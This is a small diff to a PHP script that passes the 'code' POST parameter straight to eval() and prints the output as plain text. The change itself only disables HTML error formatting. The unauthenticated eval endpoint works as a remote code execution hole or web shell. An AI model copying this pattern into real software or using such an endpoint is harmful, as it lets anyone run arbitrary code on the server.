@@ -1,6 +1,7 @@
 <?php
 
 if (isset($_POST['code'])) {
+	ini_set('html_errors', 0);
 	header('Content-type: text/plain');
 	eval($_POST['code']);
 	exit;
